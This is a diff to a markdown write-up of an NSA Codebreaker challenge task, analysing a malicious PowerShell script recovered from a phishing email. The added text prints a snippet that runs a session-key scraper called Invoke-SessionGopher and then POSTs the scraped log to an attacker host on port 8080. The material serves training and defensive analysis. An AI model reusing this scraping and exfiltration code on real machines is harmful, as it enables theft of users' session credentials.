@@ -89,10 +89,10 @@ $dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
 
 ([System.Text.Encoding]::UTF8.GetString($dec)) | Out-File C:\Users\Colton\Desktop\nsaCodebreaker\task03\zdfou.txt
 ```
-Taking a look at our outfile, we can see the downloaded script, which is definitely doing some scraping of the host machine and sending the data to another shady URI. There is a driver function called Invoke-SessionGopher that does the scraping and 
+Taking a look at our outfile, we can see the downloaded script, which is definitely doing some scraping of the host machine and sending the data to another shady URI. There is a driver function called Invoke-SessionGopher that does the scraping, with the use of its helper functions. It then sends out a POST request to the attacker's domain, sending a log file of the scraped session keys. You can take a look at the full script [here].
 
-### Snippet from zdfou
-```
+### Snippets from deobfuscated zdfou data
+``` powershell
 function Invoke-SessionGopher {
   # Value for HKEY_USERS hive
   $HKU = 2147483651
@@ -139,7 +139,13 @@ function Invoke-SessionGopher {
   $global:log
 } # Invoke-SessionGopher
 ```
+``` powershell
+Invoke-SessionGopher
+Start-Sleep 86400
+Invoke-WebRequest -uri http://xqhyg.invalid:8080 -Method Post -Body $global:log
+```
 After this little rabbit-hole of email analysis turned malware analysis, we have successfully identified two malicious scripts. One that downloads another script and the other that scrapes the machine for session keys and sends it back to the attacker via the POST request in the last line of zdfou.txt. We can now explore another avenue to detect where else the attacker has been in the next task.
 
 [User's Emails]: https://github.com/colton-gabertan/NSACodeBreaker2021/blob/task03/emails.zip
 [CyberChef]: https://gchq.github.io/CyberChef/
+[here]: https://github.com/colton-gabertan/NSACodeBreaker2021/blob/task03/zdfou.sh
